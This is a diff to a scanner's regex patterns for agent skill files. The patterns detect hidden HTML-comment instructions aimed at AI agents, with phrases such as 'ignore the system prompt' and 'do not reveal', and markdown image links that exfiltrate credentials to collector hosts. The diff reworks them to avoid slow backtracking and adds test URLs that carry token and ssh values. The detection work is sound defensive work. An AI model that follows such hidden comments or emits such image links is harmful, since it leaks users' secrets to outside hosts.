@@ -337,8 +337,15 @@ export const SKILL_SCAN_PATTERNS: readonly SkillScanPattern[] = [
     // Requires an agent-directed imperative inside the comment, not just
     // any comment, to keep ordinary editorial comments ("TODO", "see style
     // guide") out of the false-positive set.
+    //
+    // The lookahead after `<!--` is a necessary condition — the comment must
+    // close within 600 characters (200 before the imperative, the imperative,
+    // 200 after it) — checked once per comment. Without it each imperative in
+    // a comment that never closes scanned 200 characters for `-->`, and a
+    // crafted 256 KB file took a third of a second in Python. It misses only an
+    // imperative stretched past ~190 characters by whitespace between its words.
     source:
-      '<!--[\\s\\S]{0,200}?\\b(ignore\\s+(the\\s+)?(system\\s+prompt|previous)|secretly' +
+      '<!--(?=[\\s\\S]{0,600}?-->)[\\s\\S]{0,200}?\\b(ignore\\s+(the\\s+)?(system\\s+prompt|previous)|secretly' +
       '|do\\s+not\\s+(tell|mention|reveal)|hidden\\s+instructions?)\\b[\\s\\S]{0,200}?-->',
     description:
       'An HTML comment — invisible when the markdown renders — containing an agent-directed ' +
@@ -360,7 +367,22 @@ export const SKILL_SCAN_PATTERNS: readonly SkillScanPattern[] = [
     // a credential-shaped word is the classic image-based exfiltration
     // vector — an auto-rendered `![]()` fires an outbound request built
     // from the surrounding "instructions" with no user action required.
-    source: '!?\\[[^\\]]*\\]\\(\\s*https?://[^)\\s]*\\b(secret|token|password|api[_-]?key|credential|ssh)\\b[^)]*\\)',
+    //
+    // Written so a backtracking engine does each link once: the link text
+    // cannot contain `[` (a match from an inner `[` exists whenever one from an
+    // outer one does); the URL stops at `[` too, except for a bracketed IP
+    // host, so one link's URL scan never runs over the next link's; the first
+    // credential word in the URL is found inside a lookahead and kept
+    // (`(?=(…))\\1` cannot be re-entered), the rest of the URL is consumed the
+    // same way, and the link must close within 200 characters after the URL (a
+    // title). The unbounded version was cubic: 8 KB of `![x](http://a-secret-…`
+    // took a third of a second, 16 KB 2.5 s, and 256 KB of `[a](http://x`
+    // nearly two minutes in Python. It misses a credential word that comes
+    // after a raw `[` in the path or query, which RFC 3986 requires encoded.
+    source:
+      '!?\\[[^\\[\\]]*\\]\\(\\s*https?://(?:\\[[^\\]\\s)]{0,64}\\])?' +
+      '(?=([^)\\s\\[]*?\\b(?:secret|token|password|api[_-]?key|credential|ssh)\\b))\\1' +
+      '(?=([^)\\s\\[]*))\\2[^)]{0,200}\\)',
     description:
       'A markdown link or image whose URL itself names a credential-shaped value — the ' +
       'auto-rendered-image exfiltration vector, since an image fires an outbound request with ' +
@@ -368,6 +390,7 @@ export const SKILL_SCAN_PATTERNS: readonly SkillScanPattern[] = [
     matches: [
       '![status](https://collector.example.com/log?token=SECRET_VALUE)',
       'See [details](http://collector.example/report?api_key=xyz) for more.',
+      '![x](http://[2001:db8::1]:8080/c?ssh=KEY)',
     ],
     notMatches: [
       '![logo](https://example.com/assets/logo.png)',
